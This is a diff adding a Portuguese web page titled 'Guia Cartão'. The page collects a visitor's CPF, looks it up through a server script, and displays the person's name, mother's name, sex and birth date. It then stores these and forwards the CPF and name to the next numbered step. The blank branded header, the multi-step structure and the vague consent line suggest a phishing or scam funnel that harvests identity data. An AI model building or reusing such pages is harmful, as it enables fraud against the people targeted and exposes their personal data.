@@ -1,0 +1,336 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/all.min.css">
+    <title>Guia Cartão</title>
+
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f2f2f2;
+            color: #333;
+        }
+        .header {
+            display: flex;
+            align-items: center;
+            padding: 10px;
+            border-bottom: 1px solid #aa9900;
+            background-color: #FFE600;
+        }
+        .header img {
+            width: 125px;
+            padding: 10px;
+        }
+        .logo {
+            margin-left: 20px;
+        }
+        .content {
+            margin: 0 auto;
+            padding: 10px 20px 30px 20px;
+            margin: 0px 15px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            background-color: #ffffff;
+            margin-top: 20px;
+        }
+        h1 {
+            font-family: 'Sora', sans-serif;
+            color: #333;
+            font-size: 16px;
+            margin-bottom: 20px;
+        }
+        .cpf-input {
+            width: 100%;
+            padding: 15px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            box-sizing: border-box;
+        }
+        .button {
+            background-color: #FFE600;
+            color: #1c1c1c;
+            padding: 15px 30px;
+            border-radius: 10px;
+            font-family: 'Sora', sans-serif;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            text-decoration: none;
+            display: inline-block;
+            text-align: center;
+            box-sizing: border-box;
+            border: none;
+        }
+        .button2 {
+            background-color: #FFE600;
+            color: #1c1c1c;
+            padding: 15px 30px;
+            border-radius: 10px;
+            font-family: 'Sora', sans-serif;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            text-decoration: none;
+            display: inline-block;
+            text-align: center;
+            box-sizing: border-box;
+            border: none;
+        }
+        .button:hover {
+            background-color: #e6cf00;
+        }
+        label {
+            font-family: 'Sora', sans-serif;
+            color: #666;
+            font-size: 16px;
+            display: block;
+            margin-bottom: 10px;
+        }
+        .notification-card {
+            background-color: #ffeded;
+            border: 1px solid #ff5252;
+            color: #ff5252;
+            padding: 15px 20px;
+            border-radius: 8px;
+            font-family: 'Sora', sans-serif;
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+            display: none;
+        }
+        .notification-card i {
+            margin-right: 10px;
+            font-size: 18px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+    </div>
+
+    <div class="content">
+        <div id="primeiraParte">
+            <h1>Confirme seus dados para avançar</h1>
+            
+            <label for="cpf">CPF</label>
+            <input type="text" id="cpf" class="cpf-input" placeholder="000.000.000-00" maxlength="14">
+<p style="font-size: 12px; color: #999; margin-top: -10px; margin-bottom: 15px;">
+Ao continuar, você autoriza a verificação automática dos seus dados para personalização do conteúdo digital.
+</p>
+
+            <div id="notification" class="notification-card">
+                <i class="fas fa-exclamation-circle"></i>
+                <span id="notification-message"></span>
+            </div>
+            
+            <button class="button2" id="consultarBtn" onclick="this.innerHTML = '<i class=\'fas fa-spinner fa-spin\' style=\'margin-right: 10px;\'></i>Verificando CPF'">Continuar</button>
+        </div>
+        
+        <div id="resultadoModal" style="display: none;">
+            <div style="text-align: center; margin-bottom: 20px; margin-top: 20px;">
+                <svg width="40" height="40" viewBox="0 0 40 40">
+                    <circle cx="20" cy="20" r="19" fill="#4CAF50" stroke="#45a049" stroke-width="2"></circle>
+                    <path d="M12 20l6 6 12-12" stroke="white" stroke-width="3" fill="none"></path>
+                </svg>
+                <h3 style="color: #4CAF50; margin: 10px 0;">Dados encontrados com sucesso!</h3>
+            </div>
+            
+            <div id="dadosContainer" style="font-family: 'Sora', sans-serif;">
+                <p><strong>Nome:</strong> <span id="nomeResult"></span></p>
+                <p id="maeContainer" style="display: none;"><strong>Nome da Mãe:</strong> <span id="maeResult"></span></p>
+                <p><strong>Sexo:</strong> <span id="sexoResult"></span></p>
+                <p><strong>Data de Nascimento:</strong> <span id="nascimentoResult"></span></p>
+            </div>
+
+            <button class="button" onclick="window.location.href = buildUrlWithParams('../5/index.html')">
+                Continuar
+            </button>
+        </div>
+
+        <script>
+            // Função para mostrar notificação
+            function showNotification(message) {
+                const notification = document.getElementById('notification');
+                const notificationMessage = document.getElementById('notification-message');
+                
+                notificationMessage.textContent = message;
+                notification.style.display = 'flex';
+                
+                // Esconder após 3 segundos
+                setTimeout(() => {
+                    notification.style.display = 'none';
+                }, 3000);
+            }
+            
+            document.getElementById('consultarBtn').addEventListener('click', async function() {
+                const cpf = document.getElementById('cpf').value.replace(/\D/g, '');
+                const consultarBtn = document.getElementById('consultarBtn');
+                
+                console.log('CPF inserido:', cpf);
+                
+                if (cpf.length !== 11) {
+                    console.log('CPF inválido - comprimento incorreto');
+                    showNotification('Por favor, insira um CPF válido');
+                    consultarBtn.innerHTML = 'Continuar';
+                    return;
+                }
+
+                try {
+                    console.log('Iniciando consulta à API...');
+const response = await fetch('consultar.php', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/x-www-form-urlencoded'
+    },
+    body: `cpf=${cpf}`
+});
+
+
+                    console.log('Status da resposta:', response.status);
+                    console.log('Resposta completa:', response);
+
+                    const data = await response.json();
+                    console.log('Dados recebidos:', data);
+
+                    if (response.ok) {
+                        console.log('Consulta bem sucedida');
+                        console.log('Dados básicos:', data);
+                        
+                        // Adaptar os dados para o formato esperado pelo restante do código
+const dadosUsuario = {
+    NOME: data.nome,
+    CPF: cpf,
+    MAE: data.nome_mae || '',
+    SEXO: data.sexo,
+    NASCIMENTO: data.nascimento
+};
+
+
+
+
+                        
+                        // Salvar dados no localStorage
+                        localStorage.setItem('dadosUsuario', JSON.stringify(dadosUsuario));
+                        console.log('Dados salvos no localStorage');
+
+                        // Preencher dados no modal
+                        document.getElementById('nomeResult').textContent = dadosUsuario.NOME;
+                        
+                        // Verificar se tem nome da mãe e mostrar ou esconder o campo
+                        if (dadosUsuario.MAE && dadosUsuario.MAE.trim() !== '') {
+                            document.getElementById('maeResult').textContent = dadosUsuario.MAE;
+                            document.getElementById('maeContainer').style.display = 'block';
+                        } else {
+                            document.getElementById('maeContainer').style.display = 'none';
+                        }
+                        
+                        document.getElementById('sexoResult').textContent = dadosUsuario.SEXO;
+                        document.getElementById('nascimentoResult').textContent = dadosUsuario.NASCIMENTO;
+
+                        // Mostrar modal
+                        document.getElementById('resultadoModal').style.display = 'block';
+                        document.getElementById('primeiraParte').style.display = 'none';
+                        console.log('Modal exibido com sucesso');
+                    } else {
+                        console.log('CPF não encontrado. Status:', response.status);
+                        showNotification('Não foi possível validar os dados. Tente novamente.');
+                        consultarBtn.innerHTML = 'Continuar';
+                    }
+                } catch (error) {
+                    console.error('Erro detalhado:', error);
+                    console.error('Stack trace:', error.stack);
+                    showNotification('Erro ao consultar CPF. Tente novamente.');
+                    consultarBtn.innerHTML = 'Continuar';
+                }
+            });
+        </script>
+    </div>
+
+    <script>
+        // Função para formatar CPF enquanto digita
+        document.getElementById('cpf').addEventListener('input', function (e) {
+            let value = e.target.value;
+            
+            // Remove todos os caracteres não numéricos
+            value = value.replace(/\D/g, '');
+            
+            // Formata o CPF
+            if (value.length > 0) {
+                value = value.replace(/^(\d{3})(\d)/g, '$1.$2');
+                value = value.replace(/^(\d{3})\.(\d{3})(\d)/g, '$1.$2.$3');
+                value = value.replace(/^(\d{3})\.(\d{3})\.(\d{3})(\d)/g, '$1.$2.$3-$4');
+            }
+            
+            // Limita o tamanho
+            if (value.length > 14) {
+                value = value.substring(0, 14);
+            }
+            
+            e.target.value = value;
+            
+            // Posiciona o cursor no final
+            e.target.selectionStart = e.target.value.length;
+            e.target.selectionEnd = e.target.value.length;
+        });
+
+        // Função para obter parâmetros da URL
+        function getUrlParams() {
+            const params = {};
+            const queryString = window.location.search;
+
+            const urlParams = new URLSearchParams(queryString);
+            
+            for (const [key, value] of urlParams) {
+                params[key] = value;
+            }
+            return params;
+        }
+    
+        // Função para construir URL com parâmetros
+        function buildUrlWithParams(baseUrl) {
+            const params = getUrlParams();
+            const url = new URL(baseUrl, window.location.href);
+            
+            Object.keys(params).forEach(key => {
+                url.searchParams.append(key, params[key]);
+            });
+            
+            return url.toString();
+        }
+    
+        // Adiciona evento de clique no botão
+       document.addEventListener('DOMContentLoaded', function() {
+    const button = document.querySelector('.button');
+    button.addEventListener('click', function(e) {
+        e.preventDefault();
+
+        const params = getUrlParams();
+        const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuario'));
+
+        if (!dadosUsuario || !dadosUsuario.CPF) {
+            showNotification('CPF não encontrado. Faça a verificação novamente.');
+            return;
+        }
+
+        params.document = dadosUsuario.CPF;
+        params.name = dadosUsuario.NOME;
+
+        const url = new URL('../5/index.html', window.location.href);
+        Object.keys(params).forEach(key => {
+            url.searchParams.append(key, params[key]);
+        });
+
+        window.location.href = url.toString();
+    });
+});
+
+    </script>
+
+
+</body></html>
